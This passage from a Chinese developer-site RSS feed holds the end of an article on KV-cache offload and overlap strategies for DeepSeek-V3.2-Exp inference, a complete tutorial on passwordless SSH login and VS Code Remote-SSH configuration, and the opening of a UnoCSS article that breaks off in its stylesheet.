<p>DA Overlap：在 Deepseek-V3.2-Exp 的 SGLang 实现中，Attention 由两个阶段构成：forward_prepare 与 forward_core。其中，forward_prepare 又可进一步拆分为 PreAttn 与 Indexer 两部分。Indexer 表示 Indexer 本身以及所有依赖其结果的计算，PreAttn 则包含与 Indexer 无依赖关系的操作，例如 q_b_proj、bmm、copy_pe、rotary_embedding 等。为提升计算与 H2D 预取之间的重叠度，我们首先将 PreAttn 从 forward_prepare 中抽离，并推迟到 Indexer 完成之后再执行。然而，PreAttn 本身的计算量不足以完全隐藏 Latent Cache 的预取开销。为进一步增强重叠能力，SparseMLA 被划分为两个子阶段：Attn0 与 Attn1。Attn0 直接使用当前 GPU 中已存在的 Latent Cache 进行计算。Attn1 等待 H2D 预取完成后，使用新拷贝上来的 Latent Cache 继续计算。最终将两部分结果进行合并。由于 Attn0 可与 H2D 传输并行执行，因此能够有效隐藏数据拷贝延迟，显著提升整体 Overlap 程度。</p>
</li>
<li>
<p>DBA Overlap：由于 Attention 的计算量在上下文长度超过 2K 之后基本保持稳定，这使得 Dual-Attn 在长上下文场景中的重叠效果有限。为进一步提升重叠空间，我们提出了 DualBatch-Attention (DBA) Overlap。DBA 在 Dual-Attn 的基础上，将 Indexer 沿 Batch 维度划分为两部分，使得约一半的 Indexer 计算能够参与 Overlap。这样不仅扩大了可被隐藏的计算量，也使得在长上下文下仍能保持充分的计算通信重叠，从而提升端到端吞吐。</p>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0cf6434440084ce2b05d82b3f612340e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55m-5bqm5pm66IO95LqR5oqA5pyv56uZ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765441792&amp;x-signature=VDBh1EtcUwgy6m3o261rZF6HhCg%3D" alt="image.png" loading="lazy"/></p>
<p align="center">图 10.    不同 Overlap 方案对比</p>
<p>更具体而言，在 DBA Overlap 中，我们主要将 mqa_logits 与 Top-K 两部分纳入可重叠计算的范围。之所以选择这两部分，是因为它们的计算强度在 Batch Size 降低时并不会随之显著下降，从而能够有效抵消 Batch 切分所带来的性能损失，提高整体的重叠效率。图 10 展示了 DA Overlap 与 DBA Overlap 在实际执行过程中的 timeline 对比。</p>
<h4 data-id="heading-13">3.3.3.    Layerwise Overlap 策略</h4>
<p>如图 7 所示，不同层之间的 Cache Miss 行为存在显著差异，尤其是在 Sparse Memory Ratio 较小时。例如，当 Sparse Memory Ratio 为 0.2 时，每个 batch 的 Cache Miss 数量从 16.66 到 605 不等。如此大的波动性说明单一的 Overlap 策略无法高效适配所有层。</p>
<p>如图 11 所示，我们评估了三种 Overlap 策略在不同 Cache Miss Count 下的性能退化情况。在 DBA Overlap 策略中，Indexer 的计算成本会随着上下文长度线性增长，使其能够在长上下文场景中有效隐藏 Latent-Cache 的传输延迟。因此，当 Cache Miss Count 达到 512 时，DBA 由于有足够的 overlap 空间依然能够保持较高的效率。而在 Cache Miss 较低的情况下，DA Overlap 更具优势，因为它能够在不引入 Indexer 划分开销的前提下完全隐藏数据传输延迟。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e2ea948c72954e72bc615826bf599bb4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55m-5bqm5pm66IO95LqR5oqA5pyv56uZ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765441792&amp;x-signature=T%2BJAR8U94b34tMeZsoh7BHXSyEo%3D" alt="image.png" loading="lazy"/></p>
<p align="center">图 11.    不同 Overlap 策略的性能损耗，双流 + MTP=2，请求长度 128K，Batch Size=160，带宽为 37GB/s</p>
<p>我们认为，Overlap 策略的选择主要由两个因素决定：Cache Miss 情况和上下文长度。</p>
<p>首先，我们观察到在不同的上下文长度下，各层的 Cache Miss 沿 LayerID 的分布趋势具有高度一致性（如图 12 所示）。因此，我们可以通过预先测试，识别出在推理过程中最容易产生大量 Cache Miss 的关键层。</p>
<p>然后，在相同的 Sparse Memory Ratio 下，不同上下文长度所表现出的总体 Cache Miss 水平并不一致。因此，需要通过测试确定在何种 Cache Miss 阈值下应切换至 DBA 策略。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bbfb4e5156ed4560833e1015b441b085~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55m-5bqm5pm66IO95LqR5oqA5pyv56uZ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765441792&amp;x-signature=keIWr5dLkyab9CiR96py3VqCSlM%3D" alt="图片" loading="lazy"/></p>
<p align="center">图 12.    不同上下文情况不同层的 Cache Miss 对比，MTP=2，Sparse Memory Ratio=0.2</p>
<h3 data-id="heading-14">3.4.    不同上下文长度下的可扩展性</h3>
<p>如图 13 所示，随着上下文长度的增加，当 Sparse Memory Ratio ≥ 0.2 时，平均 Cache Miss 维持在相对稳定的水平。需要特别指出的是，在 32K 上下文条件下，当 Sparse Memory Ratio 较小时会出现最严重的 Cache Miss。</p>
<p>这主要是因为 GPU Buffer 过小，导致频繁的换入换出操作，从而显著增加了 Miss 发生的概率。同时如图 11 所示，我们发现 Cache Miss 过大时，现有方案无法很好地隐藏数据传输延迟，进而造成数百 us 的单层延迟。</p>
<p>因此，我们建议将 Sparse Memory Pool Size 最小配置为 6.4K 个 Slots，这样能够保证平均 Cache Miss 在 200 以下，确保数据传输延迟能够被有效 Overlap 起来。</p>
<p>同时，图 13 也表明，在相同的 Sparse Memory Ratio 下，平均 Cache Miss 随上下文长度增加而进一步下降。这意味着更长的上下文能够使用更小的 Sparse Memory Ratio，获得更大的 Batchsize 提升，进而获取更大的吞吐收益。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a7505b49fd9b4a449d58128af49a2ca7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55m-5bqm5pm66IO95LqR5oqA5pyv56uZ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765441792&amp;x-signature=TDm0RdYCmRbVfVSmzryxq08P9ZE%3D" alt="image.png" loading="lazy"/></p>
<p align="center">图 13.    不同长度上下文情况， 平均 Cache Miss 统计</p>
<h2 data-id="heading-15">4.    模拟验证</h2>
<h3 data-id="heading-16">4.1.    模拟器</h3>
<p> AIAK 团队基于内部自研的高仿真模拟器进行了性能评估。该模拟器的元数据来源于真实机器的运行结果，并通过线性插值补全未覆盖的数据点。同时，根据实际的计算流与传输流构建完整的执行框架，并纳入了 MTP、双流等系统优化机制的影响。</p>
<p>得益于该模拟器的高精度建模，我们能够在不依赖大量真实实验的情况下，准确预估大模型的推理性能，从而显著降低方案验证的成本。</p>
<h3 data-id="heading-17">4.2.    端到端性能评估</h3>
<p>在本实验中，我们评估了 32K 上下文条件下，不同 MTP 值和接受率下的性能表现，同时将其他所有配置保持与表 1 一致。根据模拟器输出的吞吐和 OPTS 结果（表 2），可以看到：MTP = 2 能够带来 69.4% 的端到端吞吐提升；当 MTP = 4 且接受率为 3.4 时，端到端吞吐提升为 45.8%。</p>
<p>我们进一步在 MTP = 2、接受率为 1.7 的配置下，对 128K 的超长上下文进行了评测。由于在该上下文长度下 Batch Size 相对较小，因此我们在实验中关闭了 Two-Batch Overlap 优化。如图 9 所示，更长的上下文长度使系统能够在较低的 Sparse Memory Ratio 下运行。最终结果如表 2 所示，当 Sparse Memory Ratio 为 0.1 时，端到端吞吐获得了 123% 的性能提升。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cf6182e256fc4e89842aed7ad2c62055~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55m-5bqm5pm66IO95LqR5oqA5pyv56uZ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765441792&amp;x-signature=J9654BIIQClAWIvl2y3KoCqSmro%3D" alt="image.png" loading="lazy"/></p>
<p align="center">表 2.    端到端性能评估</p>
<h2 data-id="heading-18">5.    结论与展望</h2>
<p>ESS 作为一种在精度无损前提下提升 Batch Size 的工程化方案，其核心的 Offload–Prefetch 机制已在诸多大模型推理场景中得到验证与广泛应用。</p>
<p>百度百舸 AIAK 团队针对 DeepSeek-V3.2-Exp 在 SGLang 中的推理路径，量身设计并模拟验证了适配该模型的 Offload 策略。实验结果充分证明了 Offload–Prefetch 机制在该模型中的可行性与显著性能潜力，为后续系统优化奠定了坚实基础。</p>
<p>未来，AIAK 团队不仅计划将 ESS 方案在实际框架中落地，还将进一步拓展其适用边界 —— 依托其对 KV Cache 存储与计算路径的解耦设计、高效的数据传输优化及灵活的缓存管理机制，将 ESS 方案扩展至更多采用 KV Cache 动态压缩方案的大模型中。同时，团队还将探索 ESS 与 SnapKV 等有损压缩方法的融合应用，持续突破推理吞吐瓶颈，为各类大模型的高效部署提供更具通用性的优化方案。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[告别输入密码！打造基于 VS Code 的极致远程开发工作流]]></title>    <link>https://juejin.cn/post/7579699192697946131</link>    <guid>https://juejin.cn/post/7579699192697946131</guid>    <pubDate>2025-12-04T08:39:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579699192697946131" data-draft-id="7579699192697864211" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="告别输入密码！打造基于 VS Code 的极致远程开发工作流"/> <meta itemprop="keywords" content="前端,Visual Studio Code"/> <meta itemprop="datePublished" content="2025-12-04T08:39:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="步履不停_"/> <meta itemprop="url" content="https://juejin.cn/user/694547078460631"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            告别输入密码！打造基于 VS Code 的极致远程开发工作流
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/694547078460631/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    步履不停_
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T08:39:27.000Z" title="Thu Dec 04 2025 08:39:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">打造极致远程开发体验：VS Code Remote SSH 与免密登录全指南</h2>
<p>在现代开发流程中，我们经常直接在远程服务器上进行开发（调试环境、修改线上代码等）。传统的 <code>vim</code> 虽然强大，但在大型项目中，如果能用 VS Code 直接编辑远程代码，效率将提升一个维度。</p>
<p>本文将带你实现一套最舒适的远程开发工作流：<strong>VS Code Remote 插件 + SSH 免密登录 + 多服务器配置</strong>。</p>
<hr/>
<h3 data-id="heading-1">一、 核心利器：配置 VS Code Remote - SSH</h3>
<p>VS Code 的 <strong>Remote - SSH</strong> 插件允许你使用本地的 VS Code 连接到远程 Linux 服务器。所有的插件、智能提示都运行在服务器端，而 UI 运行在本地，体验极其丝滑。</p>
<h4 data-id="heading-2">1. 安装插件</h4>
<ol>
<li>打开 VS Code。</li>
<li>点击左侧活动栏的 <strong>Extensions (扩展)</strong> 图标（或者按 <code>Cmd+Shift+X</code>）。</li>
<li>搜索 <strong>"Remote - SSH"</strong> (由 Microsoft 出品)。</li>
<li>点击 <strong>Install</strong> 进行安装。</li>
</ol>
<h4 data-id="heading-3">2. 初次连接（使用 IP 和密码）</h4>
<p>安装完成后，你可以尝试进行第一次连接：</p>
<ol>
<li>点击 VS Code 左下角的 <strong>绿色图标 (Remote Window)</strong>。</li>
<li>在弹出菜单中选择 <strong>"Connect to Host..." (连接到主机)</strong>。</li>
<li>选择 <strong>"Add New SSH Host..."</strong>。</li>
<li>输入连接命令：<code>ssh root@192.168.1.100</code> (替换为你的用户名和 IP)。</li>
<li><strong>痛点出现</strong>：此时系统会弹窗让你输入服务器密码。如果网络波动重连，你又得输一次密码。</li>
</ol>
<blockquote>
<p><strong>为了解决“反复输密码”和“记忆 IP 地址”的烦恼，我们需要进行接下来的 SSH 配置。</strong></p>
</blockquote>
<hr/>
<h3 data-id="heading-4">二、 基础建设：生成 SSH 密钥</h3>
<p>要实现免密登录，首先需要在本地生成一对 SSH 密钥。推荐使用 <strong>Ed25519</strong> 算法，它比传统的 RSA 更快、更安全。</p>
<h4 data-id="heading-5">1. 生成密钥命令</h4>
<p>请在你的 <strong>本地终端 (Mac/Linux)</strong> 中执行以下命令（<strong>切勿</strong>在远程服务器上执行）：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># -t 指定算法类型 (ed25519)</span>
<span class="hljs-comment"># -C 添加注释 (建议填写邮箱，便于识别)</span>
ssh-keygen -t ed25519 -C <span class="hljs-string">"your_email@example.com"</span>
</code></pre>
<p>执行后可以直接一路回车。</p>
<h4 data-id="heading-6">2. 产物说明</h4>
<p>默认情况下，密钥会生成在 <code>~/.ssh/</code> 目录下：</p>
<ul>
<li><strong><code>id_ed25519</code></strong>：<strong>私钥</strong>（核心机密，相当于家门钥匙，<strong>切勿泄露</strong>）。</li>
<li><strong><code>id_ed25519.pub</code></strong>：<strong>公钥</strong>（相当于锁芯，用于分发给目标服务器）。</li>
</ul>
<hr/>
<h3 data-id="heading-7">三、 关键步骤：配置免密登录</h3>
<p>生成密钥后，我们需要将<strong>公钥</strong>部署到目标服务器，告诉服务器：“持有这把私钥的人可以不用密码直接进”。</p>
<h4 data-id="heading-8">使用 <code>ssh-copy-id</code> 一键部署</h4>
<p>macOS 和 Linux 系统自带神器 <code>ssh-copy-id</code>，它会自动处理公钥上传、文件创建及权限设置。</p>
<p><strong>命令格式：</strong></p>
<p>Bash</p>
<pre><code class="hljs language-css" lang="css">ssh-copy-id -<span class="hljs-selector-tag">i</span> <span class="hljs-selector-attr">[公钥路径]</span> <span class="hljs-selector-attr">[用户名]</span>@[服务器IP]
</code></pre>
<p><strong>实操示例：</strong></p>
<p>Bash</p>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-comment"># 将公钥上传到测试机</span>
ssh-copy-id -i ~<span class="hljs-regexp">/.ssh/id</span>_ed25519.pub root@192.<span class="hljs-number">168.1</span>.<span class="hljs-number">100</span>
</code></pre>
<p><em>注：执行该命令时需要输入最后一次服务器密码。验证通过后，以后连接将不再需要密码。</em></p>
<hr/>
<h3 data-id="heading-9">四、 进阶管理：SSH Config 与 VS Code 完美联动</h3>
<p>当你管理的服务器变多时，记忆 IP 是反人类的。通过配置 SSH Config，我们可以给服务器起“别名”，而 VS Code 会自动读取这些别名。</p>
<h4 data-id="heading-10">1. 编辑配置文件</h4>
<p>在本地终端打开配置文件（如果文件不存在会自动创建）：</p>
<p>Bash</p>
<pre><code class="hljs language-javascript" lang="javascript">code ~<span class="hljs-regexp">/.ssh/</span>config
# 或 vim ~<span class="hljs-regexp">/.ssh/</span>config
</code></pre>
<h4 data-id="heading-11">2. 编写配置模板</h4>
<p>你可以参考以下模板，管理多台服务器：</p>
<p>代码段</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ==========================================</span>
<span class="hljs-comment"># 全局默认配置 (Global Settings)</span>
<span class="hljs-comment"># ==========================================</span>
<span class="hljs-comment"># 建议：所有服务器默认使用同一把 ed25519 钥匙，并开启心跳保持</span>
Host *
    AddKeysToAgent <span class="hljs-built_in">yes</span>            <span class="hljs-comment"># 将密钥添加到 Agent</span>
    UseKeychain <span class="hljs-built_in">yes</span>               <span class="hljs-comment"># (macOS特有) 保存到钥匙串</span>
    IdentityFile ~/.ssh/id_ed25519
    ServerAliveInterval 60        <span class="hljs-comment"># 每60秒发送心跳，防止断线</span>

<span class="hljs-comment"># ==========================================</span>
<span class="hljs-comment"># 场景 A：开发环境 (起个好记的名字)</span>
<span class="hljs-comment"># ==========================================</span>
Host dev
    HostName 192.168.1.10
    User root

<span class="hljs-comment"># ==========================================</span>
<span class="hljs-comment"># 场景 B：生产环境 (自定义端口)</span>
<span class="hljs-comment"># ==========================================</span>
Host prod
    HostName 47.100.xx.xx
    User admin
    Port 2222
</code></pre>
<h4 data-id="heading-12">3. 回到 VS Code 验证成果</h4>
<p>保存上述文件后，再次打开 VS Code：</p>
<ol>
<li>点击左下角 <strong>绿色图标</strong> -&gt; <strong>"Connect to Host..."</strong> 。</li>
<li>你会惊讶地发现，菜单里直接出现了 <strong><code>dev</code></strong> 和 <strong><code>prod</code></strong> 这两个选项。</li>
<li>点击 <strong><code>dev</code></strong>。</li>
<li><strong>见证奇迹</strong>：VS Code 直接打开了远程窗口，没有弹窗询问 IP，也没有询问密码。</li>
</ol>
<hr/>
<h3 data-id="heading-13">总结</h3>
<p>通过这套流程，我们实现了开发体验的质变：</p>
<ol>
<li><strong>环境隔离</strong>：在本地写代码，代码实际运行在服务器，环境一致性 100%。</li>
<li><strong>极速连接</strong>：无需记忆 IP，无需输入密码，点击即连。</li>
<li><strong>多端同步</strong>：只要带上你的电脑，无论在哪都能通过 VS Code 连上任意服务器开始工作。</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[uni-app 中配置 UnoCSS]]></title>    <link>https://juejin.cn/post/7579659550861901866</link>    <guid>https://juejin.cn/post/7579659550861901866</guid>    <pubDate>2025-12-04T08:42:56.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579659550861901866" data-draft-id="7579716343453810731" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="uni-app 中配置 UnoCSS"/> <meta itemprop="keywords" content="前端,Vue.js"/> <meta itemprop="datePublished" content="2025-12-04T08:42:56.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="一壶纱"/> <meta itemprop="url" content="https://juejin.cn/user/897635786437944"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            uni-app 中配置 UnoCSS
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/897635786437944/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    一壶纱
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T08:42:56.000Z" title="Thu Dec 04 2025 08:42:56 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body 